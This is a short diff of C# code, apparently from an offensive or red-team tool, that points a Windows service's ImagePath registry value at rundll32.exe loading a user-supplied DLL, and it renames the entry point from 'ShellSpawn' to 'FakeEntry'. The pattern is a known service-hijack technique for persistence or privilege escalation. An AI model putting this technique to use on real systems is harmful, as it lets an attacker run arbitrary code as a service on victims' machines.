@@ -971,7 +971,7 @@ namespace RestoreServiceModificationVariant
             string value = "ImagePath";
             string revert;
             var modify = string.Format(
-                "C:\\Windows\\System32\\rundll32.exe {0} ShellSpawn",
+                "C:\\Windows\\System32\\rundll32.exe {0} FakeEntry",
                 Path.GetFullPath(args[0]));
             var dataBytes = Encoding.Unicode.GetBytes(modify);
             var sizeData = dataBytes.Length;
